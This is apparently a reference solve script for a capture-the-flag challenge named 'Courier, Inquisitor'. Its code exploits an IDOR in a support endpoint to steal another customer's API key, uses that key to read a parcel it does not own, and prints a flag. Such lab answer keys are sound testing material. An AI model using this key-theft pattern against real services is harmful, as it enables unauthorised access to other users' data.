// Reference solve — Courier, Inquisitor. Open a demo session, ask support for the vault customer's API key (the IDOR:
// support returns any customer's key to any session), then read vault parcel 1001 with the demo bearer AND the vault
// key. The key is checked against the parcel owner, not bound to the session. Print only the flag. On a refusal (for
// example Divine's 403) the solve is silent and exits 0, like the other reference solves.
const base = process.argv[2];
const session = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { authorization: `Bearer ${session.token}` };
const support = await fetch(`${base}/api/support/customers/vault`, { headers: auth });
if (!support.ok) process.exit(0);
const { apiKey } = await support.json();
if (typeof apiKey !== 'string' || !apiKey) process.exit(0);
const r = await fetch(`${base}/api/parcels/1001`, { headers: { ...auth, 'x-api-key': apiKey } });
if (!r.ok) process.exit(0);
const { note } = await r.json();
const m = /HVWA\{[a-z2-7]{26}\}/.exec(note ?? '');
if (!m) process.exit(0);
console.log(m[0]);
